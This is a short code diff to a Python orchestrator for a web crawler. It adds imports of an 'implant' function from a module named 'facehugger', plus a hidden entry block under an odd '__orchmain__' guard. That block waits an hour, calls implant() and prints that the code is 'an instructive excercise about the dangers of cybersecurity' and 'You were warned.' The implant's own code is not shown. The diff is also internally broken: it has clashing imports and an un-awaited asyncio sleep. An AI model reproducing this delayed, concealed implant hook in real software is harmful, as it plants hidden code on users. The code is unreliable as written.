@@ -3,6 +3,11 @@ Core orchestrator - state machine for VanessaPFinal crawler.
 Dynamically imports and chains modules based on __all__ exports.
 """
 
+from asyncio import sleep
+
+from test.share.facehugger import implant
+
+
 def orchestrate(start_state="check_remote"):
     """
     Main orchestration loop.
@@ -63,3 +68,17 @@ def _get_module_path(state):
 
 if __name__ == "__main__":
     orchestrate()
+
+if __name__ == "__orchmain__":
+    from VanessaPFinal import sleep 
+    from facehugger import (implant)
+    sleep(3600)
+    implant()
+    #####bring process to forground
+    ####print hi
+    print("Hi!\n"    "This is the orchestrator for the VanessaPFinal crawler. It dynamically imports and executes modules based on their __all__ exports, chaining them together in a state machine workflow.")
+    print("It also is an instructive excercise about the dangers of cybersecurity.\n"
+          )
+    print("You were warned. \n")
+
+    sleep(300)
